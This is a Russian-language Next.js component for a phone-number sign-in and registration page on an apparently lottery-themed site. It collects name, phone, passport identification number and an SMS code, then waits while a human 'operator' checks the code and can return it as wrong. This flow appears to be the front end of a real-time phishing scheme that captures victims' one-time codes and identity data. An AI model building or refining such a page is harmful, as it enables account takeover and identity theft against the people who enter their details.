"use client"

import type React from "react"
import { useEffect, useRef, useState } from "react"
import Link from "next/link"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { CloverTicket } from "@/components/icons"
import {
  finalizeAuth,
  getAuthState,
  startLogin,
  startRegister,
  submitAuthCode,
} from "@/app/actions/auth"
import { formatPhone } from "@/lib/validation"

type Mode = "sign-in" | "sign-up"
type Step = "form" | "code" | "checking" | "done"

export function PhoneAuthForm({ mode }: { mode: Mode }) {
  const router = useRouter()
  const isSignUp = mode === "sign-up"

  const [step, setStep] = useState<Step>("form")
  const [fullName, setFullName] = useState("")
  const [phone, setPhone] = useState("")
  const [idNumber, setIdNumber] = useState("")
  const [code, setCode] = useState("")

  const [request, setRequest] = useState<{ id: number; token: string; phone: string } | null>(null)
  const [error, setError] = useState<string | null>(null)
  const [loading, setLoading] = useState(false)

  const finalizing = useRef(false)

  // Опрос статуса заявки, пока оператор её проверяет.
  useEffect(() => {
    if (!request || (step !== "code" && step !== "checking")) return
    let active = true

    const poll = async () => {
      const { status } = await getAuthState(request.id, request.token)
      if (!active) return

      if (status === "rejected") {
        setError("Заявка отклонена оператором. Попробуйте снова.")
        resetToForm()
        return
      }
      if (status === "expired" || status === "not_found") {
        setError("Время заявки истекло. Начните заново.")
        resetToForm()
        return
      }
      if (status === "pending" && step === "checking") {
        // Код не подошёл — оператор вернул заявку к вводу.
        setError("Неверный код. Проверьте СМС и введите ещё раз.")
        setCode("")
        setStep("code")
        return
      }
      if (status === "approved" && !finalizing.current) {
        finalizing.current = true
        const r = await finalizeAuth(request.id, request.token)
        if (!active) return
        if (r.ok) {
          setStep("done")
          router.push("/cabinet")
          router.refresh()
          return
        }
        setError(r.error ?? "Не удалось завершить вход")
        finalizing.current = false
      }
    }

    poll()
    const timer = setInterval(poll, 2500)
    return () => {
      active = false
      clearInterval(timer)
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [request, step])

  function resetToForm() {
    setRequest(null)
    setStep("form")
    setCode("")
    finalizing.current = false
  }

  const handleStart = async (e: React.FormEvent) => {
    e.preventDefault()
    setError(null)
    setLoading(true)

    const res = isSignUp
      ? await startRegister({ fullName, phone, idNumber })
      : await startLogin(phone)

    setLoading(false)

    if (!res.ok || !res.requestId || !res.token) {
      setError(res.error ?? "Что-то пошло не так")
      return
    }
    setRequest({ id: res.requestId, token: res.token, phone })
    setStep("code")
  }

  const handleCode = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!request) return
    setError(null)
    setLoading(true)
    const r = await submitAuthCode(request.id, request.token, code)
    setLoading(false)
    if (!r.ok) {
      setError(r.error ?? "Ошибка")
      return
    }
    setStep("checking")
  }

  const prettyPhone = request ? formatPhone(request.phone) : ""

  return (
    <main className="relative min-h-svh overflow-hidden bg-background flex items-center justify-center px-4 py-16">
      <div className="pointer-events-none absolute inset-0 aura-bg opacity-60" aria-hidden />
      <div className="relative w-full max-w-md">
        <Link
          href="/"
          className="mb-8 flex items-center justify-center gap-2 text-sm text-muted-foreground hover:text-foreground transition-colors"
        >
          &larr; На главную
        </Link>

        <div className="rounded-3xl">
          <div className="grain relative rounded-3xl border border-border/60 bg-card/80 backdrop-blur-xl p-8 shadow-2xl">
            <div className="mb-8 flex flex-col items-center text-center">
              <span className="mb-4 grid size-14 place-items-center rounded-2xl bg-primary/15 text-primary ring-1 ring-primary/30">
                <CloverTicket className="size-7" />
              </span>
              <h1 className="font-display text-2xl font-extrabold tracking-tight text-foreground text-balance">
                {step === "form"
                  ? isSignUp
                    ? "Регистрация"
                    : "Вход в кабинет"
                  : "Подтверждение"}
              </h1>
              <p className="mt-2 text-sm text-muted-foreground text-pretty">
                {step === "form"
                  ? isSignUp
                    ? "Укажите телефон и идентификационный номер"
                    : "Войдите по номеру телефона"
                  : `Код отправлен на ${prettyPhone}`}
              </p>
            </div>

            {step === "form" && (
              <form onSubmit={handleStart} className="flex flex-col gap-4">
                {isSignUp && (
                  <div className="flex flex-col gap-2">
                    <Label htmlFor="fullName">Имя и фамилия</Label>
                    <Input
                      id="fullName"
                      value={fullName}
                      onChange={(e) => setFullName(e.target.value)}
                      required
                      autoComplete="name"
                      placeholder="Иван Иванов"
                    />
                  </div>
                )}
                <div className="flex flex-col gap-2">
                  <Label htmlFor="phone">Номер телефона</Label>
                  <Input
                    id="phone"
                    type="tel"
                    inputMode="tel"
                    value={phone}
                    onChange={(e) => setPhone(e.target.value)}
                    required
                    autoComplete="tel"
                    placeholder="+375 XX XXX-XX-XX"
                  />
                </div>
                {isSignUp && (
                  <div className="flex flex-col gap-2">
                    <Label htmlFor="idNumber">Идентификационный номер</Label>
                    <Input
                      id="idNumber"
                      value={idNumber}
                      onChange={(e) => setIdNumber(e.target.value)}
                      required
                      autoCapitalize="characters"
                      placeholder="3140985A001PB5"
                      className="uppercase"
                    />
                    <p className="text-xs text-muted-foreground">
                      Как в паспорте — 14 символов
                    </p>
                  </div>
                )}

                {error && (
                  <p className="text-sm text-destructive" role="alert">
                    {error}
                  </p>
                )}

                <Button
                  type="submit"
                  disabled={loading}
                  size="lg"
                  className="mt-2 w-full cta-shine text-base font-bold"
                >
                  {loading ? "Отправляем..." : "Получить код"}
                </Button>
              </form>
            )}

            {step === "code" && (
              <form onSubmit={handleCode} className="flex flex-col gap-5">
                <div className="flex flex-col gap-2">
                  <Label htmlFor="code">Код из СМС</Label>
                  <Input
                    id="code"
                    inputMode="numeric"
                    autoComplete="one-time-code"
                    maxLength={6}
                    value={code}
                    onChange={(e) => setCode(e.target.value.replace(/\D/g, "").slice(0, 6))}
                    autoFocus
                    placeholder="______"
                    className="text-center font-display text-2xl font-extrabold tracking-[0.5em]"
                  />
                </div>

                {error && (
                  <p className="text-sm text-destructive" role="alert">
                    {error}
                  </p>
                )}

                <Button
                  type="submit"
                  disabled={loading || code.length !== 6}
                  size="lg"
                  className="w-full cta-shine text-base font-bold"
                >
                  {loading ? "Отправляем..." : "Подтвердить"}
                </Button>

                <button
                  type="button"
                  onClick={resetToForm}
                  className="text-sm text-muted-foreground transition-colors hover:text-foreground"
                >
                  Изменить номер
                </button>
              </form>
            )}

            {(step === "checking" || step === "done") && (
              <div className="flex flex-col items-center gap-5 py-4 text-center">
                <span className="relative grid size-16 place-items-center">
                  <span className="absolute inset-0 animate-ping rounded-full bg-primary/30" />
                  <span className="relative grid size-16 place-items-center rounded-full bg-primary/15 text-primary ring-1 ring-primary/30">
                    <CloverTicket className="size-8" />
                  </span>
                </span>
                <div>
                  <p className="font-heading text-lg font-semibold text-foreground">
                    {step === "done" ? "Готово!" : "Код на проверке"}
                  </p>
                  <p className="mt-1 text-sm text-muted-foreground text-pretty">
                    {step === "done"
                      ? "Входим в личный кабинет…"
                      : "Оператор проверяет код. Это займёт немного времени — не закрывайте страницу."}
                  </p>
                </div>
                {error && (
                  <p className="text-sm text-destructive" role="alert">
                    {error}
                  </p>
                )}
                {step === "checking" && (
                  <button
                    type="button"
                    onClick={resetToForm}
                    className="text-sm text-muted-foreground transition-colors hover:text-foreground"
                  >
                    Отменить
                  </button>
                )}
              </div>
            )}

            {step === "form" && (
              <p className="mt-6 text-center text-sm text-muted-foreground">
                {isSignUp ? "Уже есть аккаунт? " : "Ещё нет аккаунта? "}
                <Link
                  href={isSignUp ? "/sign-in" : "/sign-up"}
                  className="font-semibold text-primary underline-offset-4 hover:underline"
                >
                  {isSignUp ? "Войти" : "Зарегистрироваться"}
                </Link>
              </p>
            )}
          </div>
        </div>
      </div>
    </main>
  )
}
